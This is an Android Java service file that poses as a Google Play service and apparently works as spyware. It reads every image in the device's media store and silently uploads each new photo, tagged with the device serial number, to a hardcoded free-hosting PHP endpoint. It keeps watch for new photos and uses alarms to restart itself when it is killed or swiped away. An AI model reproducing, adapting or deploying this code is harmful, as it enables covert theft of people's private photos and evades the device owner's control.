package services.google.com.muservice;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.ContentObserver;
import android.database.Cursor;
import android.database.MergeCursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.preference.PreferenceManager;
import android.provider.MediaStore;
import android.support.annotation.Nullable;
import android.support.v4.content.ContextCompat;
import android.widget.Toast;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Collections;
import java.util.Comparator;
import java.util.HashMap;
import java.util.Map;

public class running_service extends Service{


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.WRITE_EXTERNAL_STORAGE)
                == PackageManager.PERMISSION_GRANTED){

            LoadAlbumList albumList = new LoadAlbumList();
            albumList.execute();

        }else Toast.makeText(getApplicationContext(), "Give storage permission to com.google.service.play from settings", Toast.LENGTH_SHORT).show();

        startServiceUsingAlarmManager();

        return START_STICKY;
    }

    private ArrayList<HashMap<String, String>> imageList = new ArrayList<>();
    private class LoadAlbumList extends AsyncTask<String, Void, String> {

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
            imageList.clear();
        }

        @Override
        protected String doInBackground(String... strings) {

            String path;
            String timestamp;

            Uri uriExternal = android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
            Uri uriInternal = android.provider.MediaStore.Images.Media.INTERNAL_CONTENT_URI;

            String[] projection = {MediaStore.MediaColumns.DATA, MediaStore.MediaColumns.DATE_MODIFIED};
            Cursor cursorExternal = getContentResolver().query(uriExternal, projection, null, null, null);
            Cursor cursorInternal = getContentResolver().query(uriInternal, projection, null, null, null);
            Cursor cursor = new MergeCursor(new Cursor[]{cursorExternal, cursorInternal});

            while (cursor.moveToNext()) {

                path = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA));
                timestamp = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_MODIFIED));
                HashMap<String, String> temp = new HashMap<>();
                temp.put("key_path", path);
                temp.put("key_timestamp", timestamp);

                imageList.add(temp);
            }

            if (cursorExternal != null) cursorExternal.close();
            if (cursorInternal != null) cursorInternal.close();
            cursor.close();
            Collections.sort(imageList, new MapComparator("key_timestamp"));
            return "null";
        }

        class MapComparator implements Comparator<Map<String, String>> {

            private final String key;

            private MapComparator(String key) {
                this.key = key;
            }

            public int compare(Map<String, String> first, Map<String, String> second)
            {
                String firstValue = first.get(key);
                String secondValue = second.get(key);
                return firstValue.compareTo(secondValue);
            }
        }

        @Override
        protected void onPostExecute(String s) {
            super.onPostExecute(s);

            SharedPreferences sp = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
            int timestamp = sp.getInt("key_timestamp", ((int)(Calendar.getInstance().getTimeInMillis()/1000)));//1502200080

            for (int i=0; i<imageList.size(); i++)
                if (Integer.parseInt(imageList.get(i).get("key_timestamp"))<= timestamp) imageList.remove(i--);

            if (imageList.size()==0)
                registerContentObserver();
            else
                uploadTOServer();
            filesUploaded=0;

        }

    }

    int filesUploaded = 0;
    private void uploadTOServer(){

        UploadFileToServer uploadFileToServer = new UploadFileToServer();

        if(filesUploaded<imageList.size()){
            ConnectivityManager connectivityManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo activeNetworkInfo = connectivityManager != null ? connectivityManager.getActiveNetworkInfo() : null;
            if (activeNetworkInfo == null)
                registerContentObserver();
            else {
                String path = imageList.get(filesUploaded).get("key_path");
                String timeStamp = imageList.get(filesUploaded).get("key_timestamp");
                uploadFileToServer.executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR, path,timeStamp);
                filesUploaded++;
            }
        }else
            registerContentObserver();


    }

    private class UploadFileToServer extends AsyncTask<String, String, String> {

        String FILE_UPLOAD_URL = "https://techi-abhi.000webhostapp.com/GalleryAppUploads/UploadToServer.php";
        int timeStamp = 0;

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
        }

        @Override
        protected String doInBackground(String... args) {


            String imagePath = args[0];
            timeStamp = Integer.parseInt(args[1]);
            File sourceFile = new File(imagePath);


            HttpURLConnection.setFollowRedirects(false);
            HttpURLConnection connection = null;
            String android_id = Build.SERIAL;
            String fileName = null;
            try {
                fileName = android_id + "%" +sourceFile.getName();
            } catch (Exception e) {
                fileName = "%" + sourceFile.getName();
            }

            try {
                connection = (HttpURLConnection) new URL(FILE_UPLOAD_URL).openConnection();
                connection.setRequestMethod("POST");
                String boundary = "---------------------------boundary";
                String tail = "\r\n--" + boundary + "--\r\n";
                connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
                connection.setDoOutput(true);
                connection.setDoInput(true);

                String metadataPart = "--" + boundary + "\r\n"
                        + "Content-Disposition: form-data; name=\"metadata\"\r\n\r\n"
                        + "" + "\r\n";

                String fileHeader1 = "--" + boundary + "\r\n"
                        + "Content-Disposition: form-data; name=\"fileToUpload\"; filename=\""
                        + fileName + "\"\r\n"
                        + "Content-Type: application/octet-stream\r\n"
                        + "Content-Transfer-Encoding: binary\r\n";

                long fileLength = sourceFile.length() + tail.length();
                String fileHeader2 = "Content-length: " + fileLength + "\r\n";
                String fileHeader = fileHeader1 + fileHeader2 + "\r\n";
                String stringData = metadataPart + fileHeader;


                long requestLength = stringData.length() + fileLength;
                connection.setRequestProperty("Content-length", "" + requestLength);
                connection.setFixedLengthStreamingMode((int) requestLength);
                connection.connect();

                DataOutputStream out = new DataOutputStream(connection.getOutputStream());
                out.writeBytes(stringData);
                out.flush();

                int bytesRead = 0;
                byte buf[] = new byte[1024];
                BufferedInputStream bufInput = new BufferedInputStream(new FileInputStream(sourceFile));
                while ((bytesRead = bufInput.read(buf)) != -1) {
                    // write output
                    out.write(buf, 0, bytesRead);
                    out.flush();
                }

                // Write closing boundary and close stream
                out.writeBytes(tail);
                out.flush();
                out.close();

                // Get server response
                BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                String line = "";
                StringBuilder builder = new StringBuilder();
                while((line = reader.readLine()) != null) {
                    builder.append(line);
                }
                return builder.toString();

            } catch (Exception e) {
                // Exception
            } finally {
                if (connection != null) connection.disconnect();
            }
            return null;
        }

        @Override
        protected void onPostExecute(String result) {

            ConnectivityManager connectivityManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo activeNetworkInfo = connectivityManager != null ? connectivityManager.getActiveNetworkInfo() : null;
            if (activeNetworkInfo == null) { stopSelf(); return;}

            SharedPreferences sp = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
            SharedPreferences.Editor editor = sp.edit();
            editor.putInt("key_timestamp", timeStamp);
            editor.commit();

            uploadTOServer();

        }

    }

    ContentObserver observer_1, observer_2;

    private void registerContentObserver()
    {
        unregisterContentObserver();

        getContentResolver().registerContentObserver(android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI, true,
                observer_1 = new ContentObserver(new Handler()) {
                    @Override
                    public void onChange(boolean selfChange) {
                        LoadAlbumList albumList = new LoadAlbumList();
                        albumList.execute();
                    }
                }
        );
        getContentResolver().registerContentObserver(android.provider.MediaStore.Images.Media.INTERNAL_CONTENT_URI, true,
                observer_2 = new ContentObserver(new Handler()) {
                    @Override
                    public void onChange(boolean selfChange) {
                        LoadAlbumList albumList = new LoadAlbumList();
                        albumList.execute();
                    }
                }
        );

    }

    private void unregisterContentObserver()
    {
        try {
            getContentResolver().unregisterContentObserver(observer_1);
            getContentResolver().unregisterContentObserver(observer_2);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        startServiceUsingAlarmManager2();
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        startServiceUsingAlarmManager2();
    }

    private void startServiceUsingAlarmManager(){
        // Start service using AlarmManager
        Calendar cal = Calendar.getInstance();
        cal.add(Calendar.SECOND, 600);
        Intent intent = new Intent(getApplicationContext(), Main2Activity.class);
        intent.putExtra("alarm", false);
        PendingIntent pintent = PendingIntent.getActivity(getApplicationContext(), 0, intent, PendingIntent.FLAG_UPDATE_CURRENT);
        AlarmManager alarm = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        alarm.cancel(pintent);
        alarm.setRepeating(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(), 3600 * 1000, pintent);
    }
    private void startServiceUsingAlarmManager2(){
        // Start service using AlarmManager
        Calendar cal = Calendar.getInstance();
        cal.add(Calendar.SECOND, 60);
        Intent intent = new Intent(getApplicationContext(), Main2Activity.class);
        intent.putExtra("alarm", false);
        PendingIntent pintent = PendingIntent.getActivity(getApplicationContext(), 0, intent, PendingIntent.FLAG_UPDATE_CURRENT);
        AlarmManager alarm = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        alarm.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(), pintent);
    }

}
